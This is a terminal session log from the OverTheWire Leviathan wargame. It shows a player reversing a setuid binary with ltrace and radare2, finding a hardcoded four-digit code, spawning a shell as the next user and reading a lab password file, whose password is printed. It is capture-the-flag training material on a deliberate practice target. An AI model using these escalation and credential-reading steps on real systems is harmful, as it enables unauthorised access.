drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r-sr-x---  1 leviathan7 leviathan6 7560 Nov 13 16:03 leviathan6*
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ltrace ./leviathan6 1234
__libc_start_main(0x804853d, 2, 0xffffd6d4, 0x80485d0 <unfinished ...>
atoi(0xffffd811, 0xffffd6d4, 0xffffd6e0, 0x80485f1)                                              = 1234
puts("Wrong"Wrong
)                                                                                    = 6
+++ exited (status 6) +++
leviathan6@leviathan:~$ ltrace ./leviathan6 aaa
__libc_start_main(0x804853d, 2, 0xffffd6d4, 0x80485d0 <unfinished ...>
atoi(0xffffd812, 0xffffd6d4, 0xffffd6e0, 0x80485f1)                                              = 0
puts("Wrong"Wrong
)                                                                                    = 6
+++ exited (status 6) +++
leviathan6@leviathan:~$ ltrace ./leviathan6 8888
__libc_start_main(0x804853d, 2, 0xffffd6d4, 0x80485d0 <unfinished ...>
atoi(0xffffd811, 0xffffd6d4, 0xffffd6e0, 0x80485f1)                                              = 8888
puts("Wrong"Wrong
)                                                                                    = 6
+++ exited (status 6) +++
leviathan6@leviathan:~$ r2 leviathan6
 -- Toggle between disasm and graph with the space key
[0x08048440]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x08048440]> pdf@main
            ;-- main:
/ (fcn) sym.main 134
|   sym.main (int arg_8h, int arg_ch);
|           ; var int local_4h_2 @ ebp-0x4
|           ; arg int arg_8h @ ebp+0x8
|           ; arg int arg_ch @ ebp+0xc
|           ; var int local_4h @ esp+0x4
|           ; var int local_1ch @ esp+0x1c
|              ; DATA XREF from 0x08048457 (entry0)
|           0x0804853d      55             push ebp
|           0x0804853e      89e5           mov ebp, esp
|           0x08048540      53             push ebx
|           0x08048541      83e4f0         and esp, 0xfffffff0
|           0x08048544      83ec20         sub esp, 0x20
|           0x08048547      c744241cd31b.  mov dword [local_1ch], 0x1bd3 ; [0x1bd3:4]=-1
|           0x0804854f      837d0802       cmp dword [arg_8h], 2       ; [0x2:4]=-1 ; 2
|       ,=< 0x08048553      7421           je 0x8048576
|       |   0x08048555      8b450c         mov eax, dword [arg_ch]     ; [0xc:4]=-1 ; 12
|       |   0x08048558      8b00           mov eax, dword [eax]
|       |   0x0804855a      89442404       mov dword [local_4h], eax
|       |   0x0804855e      c70424508604.  mov dword [esp], str.usage:__s__4_digit_code__n ; [0x8048650:4]=0x67617375 ; "usage: %s <4 digit code>\n"
|       |   0x08048565      e846feffff     call sym.imp.printf         ; int printf(const char *format)
|       |   0x0804856a      c70424ffffff.  mov dword [esp], 0xffffffff ; [0xffffffff:4]=-1 ; -1
|       |   0x08048571      e87afeffff     call sym.imp.exit           ; void exit(int status)
|       |      ; JMP XREF from 0x08048553 (sym.main)
|       `-> 0x08048576      8b450c         mov eax, dword [arg_ch]     ; [0xc:4]=-1 ; 12
|           0x08048579      83c004         add eax, 4
|           0x0804857c      8b00           mov eax, dword [eax]
|           0x0804857e      890424         mov dword [esp], eax
|           0x08048581      e89afeffff     call sym.imp.atoi           ; int atoi(const char *str)
|           0x08048586      3b44241c       cmp eax, dword [local_1ch]  ; [0x1c:4]=-1 ; 28
|       ,=< 0x0804858a      7526           jne 0x80485b2
|       |   0x0804858c      e82ffeffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x08048591      89c3           mov ebx, eax
|       |   0x08048593      e828feffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|       |   0x08048598      895c2404       mov dword [local_4h], ebx
|       |   0x0804859c      890424         mov dword [esp], eax
|       |   0x0804859f      e85cfeffff     call sym.imp.setreuid
|       |   0x080485a4      c704246a8604.  mov dword [esp], str._bin_sh ; [0x804866a:4]=0x6e69622f ; "/bin/sh"
|       |   0x080485ab      e830feffff     call sym.imp.system         ; int system(const char *string)
|      ,==< 0x080485b0      eb0c           jmp 0x80485be
|      ||      ; JMP XREF from 0x0804858a (sym.main)
|      |`-> 0x080485b2      c70424728604.  mov dword [esp], str.Wrong  ; [0x8048672:4]=0x6e6f7257 ; "Wrong"
|      |    0x080485b9      e812feffff     call sym.imp.puts           ; int puts(const char *s)
|      |       ; JMP XREF from 0x080485b0 (sym.main)
|      `--> 0x080485be      8b5dfc         mov ebx, dword [local_4h_2]
|           0x080485c1      c9             leave
\           0x080485c2      c3             ret
[0x08048440]> q
r_sys_mkdirp: fail '/home/leviathan6/.config' of '/home/leviathan6/.config/radare2'
leviathan6@leviathan:~$ rax2 0x1bd3
7123
leviathan6@leviathan:~$ ./leviathan6 7123
$ bash
leviathan7@leviathan:~$ cat /etc/leviathan_pass/leviathan8
cat: /etc/leviathan_pass/leviathan8: No such file or directory
leviathan7@leviathan:~$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
leviathan7@leviathan:~$ exit
exit
$ exit
leviathan6@leviathan:~$ exit
logout
Connection to leviathan.labs.overthewire.org closed.
➜  ~ ssh leviathan7@leviathan.labs.overthewire.org -p2223
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan7@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

leviathan7@leviathan:~$ ll
total 24
drwxr-xr-x  2 root       root       4096 Nov 13 16:03 ./
drwxr-xr-x 10 root       root       4096 Nov 13 16:03 ../
-rw-r--r--  1 root       root        220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root       root       3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root       root        655 Jun 24  2016 .profile
-r--r-----  1 leviathan7 leviathan7  178 Nov 13 16:03 CONGRATULATIONS
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
leviathan7@leviathan:~$